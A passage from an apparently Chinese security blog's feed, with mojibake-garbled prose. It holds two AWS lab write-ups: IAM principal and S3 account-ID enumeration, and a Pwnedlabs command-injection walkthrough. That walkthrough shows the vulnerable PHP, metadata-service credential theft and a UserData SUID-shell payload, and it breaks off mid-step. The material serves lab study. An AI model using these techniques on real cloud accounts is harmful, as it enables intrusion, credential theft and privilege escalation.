        <link href="https://skyblu3519.github.io/post/aws-account-id-reconnaissance/">
        </link>
        <updated>2024-07-03T15:16:12.000Z</updated>
        <content type="html"><![CDATA[<p>å½“è·å¾—ä¸€ä¸ªAWS Account IDä¹‹åæˆ‘ä»¬å¯èƒ½ä¼šå¯¹è¿™ä¸ªIDå»åšä¸€äº›ä¿¡æ¯æ”¶é›†ï¼Œè€Œè¯¥è´¦æˆ·çš„ IAM User/Role æ˜¯ä¼šè¢«è€ƒè™‘çš„ä¸€ä¸ªä¿¡æ¯ã€‚ä¸‹é¢å°±è®°ä¸€ä¸‹å¦‚ä½•é€šè¿‡ä¸€ä¸ª Account ID æ”¶é›†è¯¥è´¦æˆ·çš„ IAM User/Roleã€‚</p>
<h1 id="ä½¿ç”¨è§’è‰²ä¿¡ä»»ç­–ç•¥">ä½¿ç”¨è§’è‰²ä¿¡ä»»ç­–ç•¥</h1>
<p>å‡è®¾æˆ‘ä»¬ç°åœ¨æ‹¿åˆ°äº†ä¸€ä¸ªè´¦æˆ·IDä¸º<code>427648302155</code>ï¼Œæˆ‘ç°åœ¨æƒ³çŸ¥é“è¿™ä¸ªè´¦æˆ·ä¸‹æœ‰å“ªäº›Userå’ŒRoleã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨è‡ªå·±çš„AWSè´¦æˆ·é‡Œéšä¾¿æ–°å»ºä¸€ä¸ªè§’è‰²ï¼Œå¹¶å°†ä¿¡ä»»ç­–ç•¥é…ç½®ä¸º</p>
<pre><code class="language-shell">{
	&quot;Version&quot;: &quot;2012-10-17&quot;,
	&quot;Statement&quot;: [
		{
			&quot;Sid&quot;: &quot;Statement1&quot;,
			&quot;Effect&quot;: &quot;Deny&quot;,
			&quot;Principal&quot;: {
			    &quot;AWS&quot;: &quot;*&quot;
			},
			&quot;Action&quot;: &quot;sts:AssumeRole&quot;
		}
	]
}
</code></pre>
<p>åˆ›å»ºå¥½ä¹‹åæˆ‘ä»¬ç‚¹å‡»è¿›å…¥è§’è‰²ï¼Œç¼–è¾‘ä¿¡ä»»ç­–ç•¥<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720015041788-f8c779ad-ba14-4682-b64f-ed71f0c1722c.png" alt="image.png" loading="lazy"></p>
<p>ä¿®æ”¹ Principal -&gt; AWS ä¸º<code>427648302155</code>ä¸‹çš„ä¸€ä¸ª User/Roleï¼Œæ¯”å¦‚<code>arn:aws:iam::427648302155:user/admin</code>ã€‚ç„¶åæˆ‘ä»¬æ›´æ–°ç­–ç•¥ï¼Œå‡ºç°æŠ¥é”™<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720015370572-6256f360-a090-4b7f-9c09-0a608016345b.png" alt="image.png" loading="lazy"></p>
<p>è¿™ä¸ªIDæ˜¯ Pwnedlabså®éªŒ <a href="https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket">Identify the AWS Account ID from a Public S3 Bucket</a> ä¸­çš„IDï¼Œå®ƒå­˜åœ¨ä¸€ä¸ªç”¨æˆ·æ˜¯ <code>s3user</code>ã€‚ç°åœ¨æˆ‘ä»¬ä¿®æ”¹<code>AWS</code>ä¸º<code>arn:aws:iam::427648302155:user/s3user</code>ï¼Œå‘ç°ç­–ç•¥æˆåŠŸæ›´æ–°ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720015526370-8fd71f01-0804-4e97-ad32-889f21f67ad8.png" alt="image.png" loading="lazy"></p>
<p>é€šè¿‡è¿™ç§æ–¹å¼æˆ‘ä»¬å°±èƒ½æšä¸¾ä¸€ä¸ªè´¦æˆ·ä¸‹å®ƒçš„ IAM User/Roleï¼Œå¦‚æœç›®æ ‡çš„æŸä¸ªè§’è‰²ä¿¡ä»»ç­–ç•¥é…ç½®é”™è¯¯ï¼Œæ¯”å¦‚</p>
<pre><code class="language-shell">{
	&quot;Version&quot;: &quot;2012-10-17&quot;,
	&quot;Statement&quot;: [
		{
			&quot;Sid&quot;: &quot;Statement1&quot;,
			&quot;Effect&quot;: &quot;Allow&quot;,
			&quot;Principal&quot;: {
			    &quot;AWS&quot;: &quot;*&quot;
			},
			&quot;Action&quot;: &quot;sts:AssumeRole&quot;
		}
	]
}
</code></pre>
<p>é‚£æˆ‘ä»¬å°±å¯ä»¥æ‰®æ¼”è¯¥è§’è‰²ï¼Œä»¥è·å–ç›®æ ‡çš„æ›´å¤šä¿¡æ¯ã€‚äº‘æ¸—é€å·¥å…·pacuçš„<code>iam__enum_roles</code>æ¨¡å—å°±æ˜¯ç”¨è¿™ç§æ–¹å¼å®ç°çš„ã€‚åœ¨ä½¿ç”¨æ—¶æˆ‘ä»¬å°†<code>--role-name</code>é…ç½®ä¸ºå½“å‰è´¦æˆ·ä¸­ä¸€ä¸ªå¯ç”¨è§’è‰²ï¼Œ<code>--account-id</code>è®¾ç½®ä¸ºè¦æšä¸¾çš„ç›®æ ‡IDï¼Œå·¥å…·ä¾¿ä¼šç”¨è‡ªå·±çš„å­—å…¸å¯¹è¯¥ç›®æ ‡è¿›è¡Œæšä¸¾</p>
<pre><code class="language-shell">run iam__enum_users --role-name IAMEnum --account-id 104506445608
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720016049180-bf641fc4-95b1-4ca2-8182-ec87cfb5e6c8.png" alt="image.png" loading="lazy"></figure>
<h1 id="ä½¿ç”¨s3lambdaè®¿é—®ç­–ç•¥">ä½¿ç”¨S3/Lambdaè®¿é—®ç­–ç•¥</h1>
<p>è¿™ä¸¤ç§æ–¹æ³•å’Œä¸Šé¢çš„ä¹Ÿæ˜¯å¤§åŒå°å¼‚ï¼Œéƒ½æ˜¯æ ¹æ®å°†ä¸€ä¸ªIAMä¸»ä½“ä»˜ç»™S3/Lambdaç­–ç•¥ä¸Šæ—¶çš„æŠ¥é”™ä¿¡æ¯è¿›è¡Œåˆ¤æ–­çš„ã€‚è¿™é‡Œå°±ä¸å†èµ˜è¿°ï¼Œè¯¦è§å®éªŒï¼š<a href="https://pwnedlabs.io/labs/unauthenticated-aws-iam-principals-enumeration">https://pwnedlabs.io/labs/unauthenticated-aws-iam-principals-enumeration</a></p>
<p>S3</p>
<pre><code class="language-json">{
  &quot;Version&quot;: &quot;2012-10-17&quot;,
  &quot;Statement&quot;: [
    {
      &quot;Sid&quot;: &quot;IAM Enum&quot;,
      &quot;Effect&quot;: &quot;Deny&quot;,
      &quot;Principal&quot;: {
        &quot;AWS&quot;: &quot;arn:aws:iam::104506445608:role/batch&quot;
      },
      &quot;Action&quot;: &quot;s3:GetObject&quot;,
      &quot;Resource&quot;: &quot;arn:aws:s3:::iam-enum/*&quot;
    }
  ]
}
</code></pre>
<p><img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1718630007343-fa9b91ff-2f6e-4bbe-a9fa-422465bf14f7.png" alt="image.png" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1718630011701-f152e5e3-ece7-4fa5-9428-6f62304450af.png" alt="image.png" loading="lazy"></p>
<p>Lambda</p>
<pre><code class="language-json">aws lambda add-permission --function-name IAMEnum --action lambda:GetFunction --statement-id IAMEnum --principal &quot;arn:aws:iam::104506445608:role/admin&quot;
aws lambda add-permission --function-name IAMEnum --action lambda:GetFunction --statement-id IAMEnum --principal &quot;arn:aws:iam::104506445608:role/batch&quot;
</code></pre>
<h1 id="è·å–å…¬å¼€s3çš„-aws-account-id">è·å–å…¬å¼€S3çš„ AWS Account ID</h1>
<p>å®éªŒç¯å¢ƒï¼š<a href="https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket">Identify the AWS Account ID from a Public S3 Bucket</a></p>
<p>ä¸»è¦è¯´ä¸‹è¿™ä¸ªåŸç†ã€‚åœ¨é¢˜ç›®ç»™çš„ç½‘é¡µä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒä½¿ç”¨çš„S3åç§°ï¼š<code>mega-big-tech</code><br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1717052598303-c7b3fdf7-1835-488e-b80e-126a712129b7.png" alt="image.png" loading="lazy"></p>
<p>æ˜¯ä¸€ä¸ªå…¬å¼€çš„S3ï¼Œå¯ä»¥ç›´æ¥è®¿é—®æŸ¥çœ‹<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1717052644607-27717787-9a44-458e-ad18-4a69ac87851a.png" alt="image.png" loading="lazy"></p>
<p>ä½¿ç”¨çš„æ–¹æ³•å‚è€ƒï¼š<a href="https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/">Finding the Account ID of any public S3 bucket</a></p>
<p>ä¸‹é¢è®²ä¸‹è¿™ä¸ªåŸç†ï¼Œé¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªè§’è‰²ï¼Œæƒé™ä½¿ç”¨AWSæ‰˜ç®¡ç­–ç•¥é‡Œé¢çš„<code>AmazonS3ReadOnlyAccess</code>ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017041271-aaf68d48-1a8f-48e7-963e-b2ee25da9b51.png" alt="image.png" loading="lazy"></p>
<p>æ‰®æ¼”è¿™ä¸ªè§’è‰²æˆ‘ä»¬æ˜¯å¯ä»¥åˆ—å‡ºè¿™ä¸ªS3çš„å†…å®¹çš„<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017346073-b20dc36e-3b8b-4d4c-9dd1-fce829155f85.png" alt="image.png" loading="lazy"></p>
<p>æ¸…ç©ºSessionToken<code>aws configure set aws_session_token &quot;&quot;</code>ï¼Œåˆ‡æ¢åˆ°åŸæ¥çš„ç”¨æˆ·ã€‚è¯´ä¸€ä¸‹è¿™ä¸ªç©·ä¸¾çš„åŸç†ã€‚åœ¨æ‰§è¡Œ<code>sts:Assumerole</code>çš„æ—¶å€™ï¼Œå¯ä»¥æŒ‡å®š<code>--policy</code>å‚æ•°æ¥æŒ‡å®šä¸€ä¸ªé™„åŠ çš„æƒé™ç­–ç•¥ï¼Œè¿™ä¸ªç­–ç•¥å°†ä¸ä½ è¦æ‰®æ¼”çš„è§’è‰²çš„æƒé™ç­–ç•¥ç»“åˆï¼ˆå–äº¤é›†ï¼‰ï¼Œæœ€ç»ˆç¡®å®šä½ åœ¨è¯¥è§’è‰²ä¸‹çš„å®é™…æƒé™ã€‚</p>
<p>æ ¹æ®è¿™ä¸ªåˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py"><strong>s3-account-search</strong></a>ï¼Œå®ƒé™„åŠ çš„ç­–ç•¥<code>--policy</code>æ˜¯</p>
<pre><code class="language-json">{
    &quot;Version&quot;: &quot;2012-10-17&quot;,
    &quot;Statement&quot;: [
        {
            &quot;Sid&quot;: &quot;AllowResourceAccount&quot;,
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: &quot;s3:*&quot;,
            &quot;Resource&quot;: &quot;*&quot;,
            &quot;Condition&quot;: {
                &quot;StringLike&quot;: {&quot;s3:ResourceAccount&quot;: [f&quot;{digits}*&quot;]},
            },
        },
    ],
}
</code></pre>
<p>å…¶ä¸­<code>Condition</code>å…ƒç´ å…è®¸ä½ æŒ‡å®šç­–ç•¥ç”Ÿæ•ˆçš„æ¡ä»¶ï¼Œè€Œåœ¨ <code>Condition</code> å…ƒç´ ä¸­å¯ä»¥ä½¿ç”¨æ¡ä»¶è¿ç®—ç¬¦æ¥å°†ç­–ç•¥ä¸­çš„æ¡ä»¶é”®å’Œå€¼ä¸è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­çš„å€¼è¿›è¡ŒåŒ¹é…ã€‚å…¶ä¸­çš„<code>StringLike</code>å¯ä»¥åšé€šé…ç¬¦åŒ¹é…ï¼ˆå‚è€ƒï¼š<a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html">IAM JSON ç­–ç•¥å…ƒç´ ï¼šæ¡ä»¶è¿ç®—ç¬¦</a>ï¼‰ï¼Œä¾æ¬¡æ¥çˆ†ç ´å‡º<code>s3:ResourceAccount</code>ï¼Œä¹Ÿå°±æ˜¯è¯¥<strong>S3</strong>èµ„æºçš„<strong>Account-ID</strong>ã€‚</p>
<p>ä¸‹é¢åšä¸ªæµ‹è¯•ã€‚<code>&quot;s3:ResourceAccount&quot;:&quot;0*&quot;</code>ä¹Ÿå°±æ˜¯<code>Account-ID</code>æ˜¯0å¼€å¤´</p>
<pre><code class="language-json">aws sts assume-role --role-arn arn:aws:iam::&lt;Account-ID&gt;:role/s3reader --role-session-name skky --policy '{&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:&quot;s3:*&quot;,&quot;Resource&quot;:&quot;*&quot;,&quot;Condition&quot;:{&quot;StringLike&quot;:{&quot;s3:ResourceAccount&quot;:&quot;0*&quot;}}}]}' 
</code></pre>
<p>è¿™æ—¶æ— æ³•åˆ—å‡ºS3å†…å®¹ï¼Œè¯´æ˜è¯¥S3çš„<code>Account-ID</code>ä¸æ˜¯0å¼€å¤´çš„<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017715189-7ff834e6-7a79-4598-9b7a-8d29cec5fdf4.png" alt="image.png" loading="lazy"></p>
<p>è€Œä¿®æ”¹ä¸º<code>&quot;s3:ResourceAccount&quot;:&quot;1*&quot;</code>å¯ä»¥è®¿é—®<br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017934528-5e3c0b6e-86a9-4d88-b909-e732455c0eb2.png" alt="image.png" loading="lazy"></p>
<p>åˆ©ç”¨è¿™ä¸ªæ–¹å¼æˆ‘ä»¬å°±å¯ä»¥æšä¸¾å‡ºè¯¥S3çš„Account-IDï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨è„šæœ¬è¿›è¡Œæšä¸¾<a href="https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py">https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py</a><br>
<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720018611726-464cc43d-4e8f-4e4c-9ab2-e941fca45463.png" alt="image.png" loading="lazy"></p>
<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>
<p><a href="https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/">Assume the Worst: Enumerating AWS Roles through â€˜AssumeRoleâ€™</a><br>
<a href="https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/">Using AWS Account IDâ€™s for IAM User Enumeration</a><br>
<a href="https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/">Unauthenticated AWS Role Enumeration (IAM Revisited)</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Pwnedlabs]Command Injection to EC2 User Data Privilege Escalation]]></title>
        <id>https://skyblu3519.github.io/post/pwnedlabscommand-injection-to-ec2-user-data-privilege-escalation/</id>
        <link href="https://skyblu3519.github.io/post/pwnedlabscommand-injection-to-ec2-user-data-privilege-escalation/">
        </link>
        <updated>2024-07-03T15:10:08.000Z</updated>
        <content type="html"><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation">https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation</a></p>
<p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>After a successful smishing attack on your client, Huge Logistics, you've obtained AWS credentials for a user account. Your task is to use these initial credentials to explore and possibly expand your access within their cloud environment. Your objective is to demonstrate impact of smishing the user. Let the hunt begin.</p>
</blockquote>
<h1 id="èƒŒæ™¯çŸ¥è¯†">èƒŒæ™¯çŸ¥è¯†</h1>
<h2 id="aws-userdata">AWS UserData</h2>
<p>é€šè¿‡ç¼–è¾‘ <strong>UserData</strong> å¯ä»¥è®© <strong>EC2</strong> å¯åŠ¨æ—¶æ‰§è¡Œ <strong>Shellè„šæœ¬</strong> å’Œ <strong>cloud-initæŒ‡ä»¤</strong>ã€‚</p>
<p>æ”¯æŒçš„æ ¼å¼æœ‰ï¼Œå¦‚æœåªæ‰§è¡Œ<strong>Shellè„šæœ¬</strong>ï¼Œåˆ™è„šæœ¬å†…å®¹å¿…é¡»ä»¥<code>#!</code>å¼€å¤´åé¢æŒ‡å‘è¦è¯»å–è„šæœ¬çš„è§£é‡Šå™¨çš„è·¯å¾„ï¼ˆé€šå¸¸ä¸º <code>/bin/bash</code>ï¼‰</p>
<pre><code class="language-shell">#!/bin/bash
yum update -y
amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2
yum install -y httpd mariadb-server
systemctl start httpd
systemctl enable httpd
usermod -a -G apache ec2-user
chown -R ec2-user:apache /var/www
chmod 2775 /var/www
find /var/www -type d -exec chmod 2775 {} \;
find /var/www -type f -exec chmod 0664 {} \;
echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/html/phpinfo.php
</code></pre>
<p>å¦‚æœè¦ä¼ é€’<strong>cloud-initæŒ‡ä»¤</strong>ï¼Œé‚£ä¹ˆåˆ™è¦ä»¥<code>#cloud-config</code>å¼€å¤´</p>
<pre><code class="language-yaml">#cloud-config
repo_update: true
repo_upgrade: all

packages:
- httpd
- mariadb-server

runcmd:
- [ sh, -c, &quot;amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2&quot; ]
- systemctl start httpd
- sudo systemctl enable httpd
- [ sh, -c, &quot;usermod -a -G apache ec2-user&quot; ]
- [ sh, -c, &quot;chown -R ec2-user:apache /var/www&quot; ]
- chmod 2775 /var/www
- [ find, /var/www, -type, d, -exec, chmod, 2775, {}, \; ]
- [ find, /var/www, -type, f, -exec, chmod, 0664, {}, \; ]
- [ sh, -c, 'echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/html/phpinfo.php' ]
</code></pre>
<p>å¦‚æœè¦<strong>cloud-init</strong>å’Œ<strong>Shell</strong>æ··ç”¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ mime-multi part æ–‡ä»¶ç±»å‹ï¼Œä½¿ç”¨ <code>text/cloud-config </code>å’Œ <code>text/x-shellscript</code> æ¥è¡¨ç¤º<strong>cloud-initæŒ‡ä»¤</strong>å’Œ<strong>Shellè„šæœ¬</strong>ã€‚</p>
<pre><code class="language-yaml">Content-Type: multipart/mixed; boundary=&quot;//&quot;
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset=&quot;us-ascii&quot;
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename=&quot;cloud-config.txt&quot;

#cloud-config
cloud-init directives

--//
Content-Type: text/x-shellscript; charset=&quot;us-ascii&quot;
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename=&quot;userdata.txt&quot;

#!/bin/bash
shell script commands
--//--
</code></pre>
<h1 id="è§£é¢˜æµç¨‹">è§£é¢˜æµç¨‹</h1>
<p>ä½¿ç”¨é¢˜ç›®ç»™çš„AK/SKç™»å½•ï¼Œ<code>aws sts get-caller-identity</code>ç¡®è®¤èº«ä»½<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719995161639-adbba1ba-52de-4f19-900a-d6ab377efac2.png" alt="image.png" loading="lazy"></p>
<p>ç„¶åå°±æ˜¯å¸¸è§„çš„ç­–ç•¥æŒ–æ˜ã€‚ä»ç”¨æˆ·çš„æ‰˜ç®¡ç­–ç•¥<code>arn:aws:iam::564061345713:policy/Compute</code>ä¸­å‘ç°ç”¨æˆ·æ‹¥æœ‰<code>ec2:DescribeInstances</code>æƒé™</p>
<pre><code>aws iam list-attached-user-policies --user-name ryan
aws iam get-policy --policy-arn arn:aws:iam::564061345713:policy/Compute
aws iam get-policy-version --policy-arn arn:aws:iam::564061345713:policy/Compute --version-id v1
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719995316352-3243e9a7-b513-479e-a46f-edeb6a35106f.png" alt="image.png" loading="lazy"></figure>
<p>å°è¯•åˆ—å‡ºå®ä¾‹ï¼Œè¿™é‡Œä½¿ç”¨<code>--filters</code>ç­›é€‰å‡ºè¿è¡Œçš„å®ä¾‹ï¼Œå†ç”¨<code>--query</code>ç²¾ç®€è¾“å‡ºçš„ä¿¡æ¯ã€‚è¿™é‡Œçœ‹åˆ°äº†ä¸€ä¸ªå†…ç½‘IPä¸º<code>10.8.0.31</code>çš„è¿è¡Œå®ä¾‹ï¼ˆå¯¹å®ä¾‹çš„è®¿é—®è¦ä½¿ç”¨å¹³å°æä¾›çš„VPNï¼‰ã€‚</p>
<pre><code>aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query 'Reservations[].Instances[].[Tags[?Key==`Name`].Value | [0],InstanceId,Platform,State.Name,PrivateIpAddress,PublicIpAddress,InstanceType,PublicDnsName,KeyName]'
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998921283-fc5c0737-8788-4123-9279-38e3de8ed353.png" alt="image.png" loading="lazy"></figure>
<p>å®ä¾‹å¼€æ”¾äº†22å’Œ80ç«¯å£<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998916790-4370689c-b0a3-4249-9214-43d72b352294.png" alt="image.png" loading="lazy"></p>
<p>è®¿é—®<code>/tracking</code>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„æ¼æ´ï¼Œå¯¼è‡´çš„åŸå› è¿™é‡Œå°±ç›´æ¥çœ‹æºç äº†ï¼Œæ­£å¸¸æµ‹æˆ‘è§‰å¾—è‡ªå·±æ˜¯æƒ³ä¸åˆ°äº†ã€‚</p>
<pre><code class="language-php">&lt;?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST[&quot;tracking-number&quot;] != 'e.g. RH729454758CN') {

  $number = $_POST[&quot;tracking-number&quot;];
  system(&quot;grep \&quot;$number\&quot; shipment_export.csv 2&gt;&amp;1 &gt; /dev/null &amp;&amp; echo \&quot;&lt;p&gt;The parcel is arriving soon&lt;/p&gt;\&quot; || echo \&quot;&lt;p&gt;Could not find shipment number: $number&lt;/p&gt;\&quot;&quot;);
}

?&gt;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998886725-8382dc5a-d2e7-4a05-a848-0b9adf6c952c.png" alt="image.png" loading="lazy"></figure>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨<code>$(command)</code>æ¥æ³¨å…¥å‘½ä»¤<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998880778-a520c044-5f1b-4196-b0fc-486bdedf20e9.png" alt="image.png" loading="lazy"></p>
<p>åœ¨<code>/file_backups</code>å‘ç°<code>id_rsa</code>æ–‡ä»¶ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998853867-3dbfc0b2-c50b-4653-bdd1-960468546bb6.png" alt="image.png" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998871614-8cba45fc-a609-44ad-b81c-16516e13331a.png" alt="image.png" loading="lazy"></p>
<p>è¯»å–ä¿å­˜å°†å…¶ä½œä¸ºå®ä¾‹çš„ç§é’¥å°è¯•ç™»å½•</p>
<pre><code>vim id_rsa
chmod 400 id_rsa
ssh -i id_rsa ryan@10.222.0.237
</code></pre>
<p><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998845144-23b5d467-be99-4ede-a616-3cb27221785e.png" alt="image.png" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998840223-b4111775-4866-493c-9cea-126bc6145d93.png" alt="image.png" loading="lazy"></p>
<p>è¯·æ±‚169.254.169.254æŸ¥çœ‹å®ä¾‹ä¸Šæ˜¯å¦æœ‰å…³è”çš„IAMè§’è‰²</p>
<pre><code>curl 169.254.169.254/latest/meta-data/iam/info/
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719999089566-ee029003-390e-4908-8531-d2434d456504.png" alt="image.png" loading="lazy"></figure>
<p>è¿™é‡Œæ˜¾ç¤ºäº†ä¸€ä¸ªComputeAdminè§’è‰²ï¼ŒæŸ¥çœ‹å®ƒçš„å‡­è¯</p>
<pre><code>curl 169.254.169.254/latest/meta-data/iam/security-credentials/ComputeAdmin/
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998826694-9943ef0d-21e2-46c9-953c-73583f45687e.png" alt="image.png" loading="lazy"></figure>
<p>ç”¨å®ƒæä¾›çš„å‡­è¯æ‰®æ¼”è§’è‰²<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998802915-60ebf549-f97e-47e3-9370-76ea1bf07801.png" alt="image.png" loading="lazy"></p>
<p>è¿˜æ˜¯ç­–ç•¥æŒ–æ˜ä¸€æ³¢ã€‚åœ¨è§’è‰²æ‰˜ç®¡ç­–ç•¥ä¸­æ˜¾ç¤ºè¯¥è§’è‰²å…·æœ‰<code>ec2:ModifyInstanceAttribute</code>æƒé™ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœæ­¢å’Œå¯åŠ¨å®ä¾‹</p>
<pre><code>aws iam list-attached-role-policies --role-name ComputeAdmin
aws iam get-policy --policy-arn arn:aws:iam::728997323732:policy/ComputeAdmin
aws iam get-policy-version --policy-arn arn:aws:iam::728997323732:policy/ComputeAdmin --version-id v1
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719999300825-67f56790-bd14-42b8-ab84-c2eb74740bd4.png" alt="image.png" loading="lazy"></figure>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœæ­¢å®ä¾‹ï¼Œç„¶åä¿®æ”¹å®ä¾‹çš„Userdataæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ä»¥å®ç°å®ä¾‹ç”¨æˆ· **ryan **çš„ææƒã€‚ä¼ å…¥çš„userdataå¦‚ä¸‹ï¼š</p>
<ul>
<li>ä½¿ç”¨cloud-initæŒ‡ä»¤æŒ‡å®šäº† scripts-user æ¨¡å—ï¼Œé…ç½®ä¸ºåœ¨æ¯æ¬¡ç³»ç»Ÿå¯åŠ¨æ—¶éƒ½æ‰§è¡Œã€‚
<ul>
<li>scripts-user æ¨¡å—å…è®¸ç”¨æˆ·ç¼–å†™è‡ªå®šä¹‰è„šæœ¬å¹¶ç¡®ä¿å®ƒä»¬åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œã€‚è¿™äº›è„šæœ¬é€šå¸¸è¢«æ”¾ç½®åœ¨å®ä¾‹çš„ <code>/var/lib/cloud/instance/scripts</code> ç›®å½•ä¸­ã€‚</li>
</ul>
</li>
<li>åœ¨shelléƒ¨åˆ†ï¼Œé¦–å…ˆå¤åˆ¶ <code>/bin/sh</code> åˆ° <code>/home/ryan/suid</code>ã€‚æ¥ç€ä½¿ç”¨ <code>chmod u+s /home/ryan/suid</code> å‘½ä»¤è®¾ç½® UID ä½ï¼Œä½¿ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä»¥ root ç”¨æˆ·çš„æƒé™è¿è¡Œ <code>/home/ryan/suid</code>ã€‚</li>
</ul>
<pre><code>Content-Type: multipart/mixed; boundary=&quot;//&quot;
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset=&quot;us-ascii&quot;
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename=&quot;cloud-config.txt&quot;

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset=&quot;us-ascii&quot;
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename=&quot;userdata.txt&quot;

#!/bin/bash
cp /bin/sh /home/ryan/suid
chmod u+s /home/ryan/suid
whoami &gt;&gt; /home/ryan/output
--//
</code></pre>
<p>å°†ä¸Šé¢çš„æ–‡ä»¶ä¿å­˜ä¸º<code>userdata.txt</code>ï¼Œå†å°†å…¶è¾“å‡ºä¸ºbase64ç¼–ç </p>
<pre><code>base64 -i userdata.txt -o userdata.b64.txt
</code></pre>
<p>åœ¨å®ä¾‹ä¸­æŸ¥çœ‹é€šè¿‡å…ƒæ•°æ®æŸ¥çœ‹å®ä¾‹ID</p>
<pre><code># curl http://169.254.169.254/latest/meta-data/instance-id
i-0d9a8dae1fb451cff
</code></pre>
<p>ComputeAdminè§’è‰²ä¹Ÿç¡®å®æ‹¥æœ‰è¯¥å®ä¾‹æƒé™<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011322191-2ea5cbf4-ed66-4c54-997f-c4e7b29e4c2f.png" alt="image.png" loading="lazy"></p>
<p>æš‚åœå®ä¾‹</p>
<pre><code>aws ec2 stop-instances --instance-id i-0d9a8dae1fb451cff
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011010761-b08633df-2946-4b6d-b260-aaf95345659e.png" alt="image.png" loading="lazy"></figure>
<p>ä¿®æ”¹userdata</p>
